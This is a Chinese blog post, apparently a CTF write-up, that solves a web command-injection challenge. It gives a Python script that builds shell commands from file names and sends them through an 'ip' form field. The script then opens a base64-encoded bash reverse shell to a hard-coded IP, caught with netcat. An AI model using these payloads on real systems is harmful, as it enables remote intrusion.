<!--yml
category: 未分类
date: 2022-04-26 14:38:16
-->

# 2018 SCUCTF web题：cat？非常规题解_东坡何罪发文章总是审核不通过，去博客园了的博客-CSDN博客

> 来源：[https://blog.csdn.net/perfect0066/article/details/85108416](https://blog.csdn.net/perfect0066/article/details/85108416)

# 主要思路

1.寻找可以写入的目录
2.通过 **>** 构造文件名,在通过 **ls -th>g** 将命令写入文件
3.通过**bash -i >& /dev/tcp/你的公网ip/监听的端口 0>&1**构造反弹shell
4.在服务器使用 **"nc -lnvp 相应端口"**

# python脚本如下

```
 import requests
import time
url='http://120.78.66.77:87/exec.php'

tmp='1.1.1.1;cd /t*;'

data1=[
	'>dir',
	'>sl',
	'>g\>',
	'>ht-',
	'*>v',
	'>rev',
	'*v>x',
	'cat x']

for i in data1:
	i=tmp+i;
	r=requests.post(url,{'ip':i})

data2=[
        'rm d*',
        'rm s*',
        'rm g*',
        'rm h*',
        'rm v',
        'rm r*',
        '>g']
for i in data2:
	i=tmp+i;
	r=requests.post(url,{'ip':i})

data2_5=[
        '>\>a',
        '>d\\',
        '>\ -\\',
        '>e64\\',
        '>bas\\',
        '>\|\\']
for i in data2_5:
	i=tmp+i;
	r=requests.post(url,{'ip':i})

data3='YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMTAuNDQuNTcvODg4OCAwPiYx'
while data3 != '':
        i=tmp+'>'+data3[-2:]+r'\\'
        data3=data3[0:-2]
        r=requests.post(url,{'ip':i})

data4=[
        '>o\ \\',
        '>ech\\',
        'sh x',
        'sh g',
        'rm *\'
        ]

for i in data4:
	i=tmp+i;
	r=requests.post(url,{'ip':i}) 
```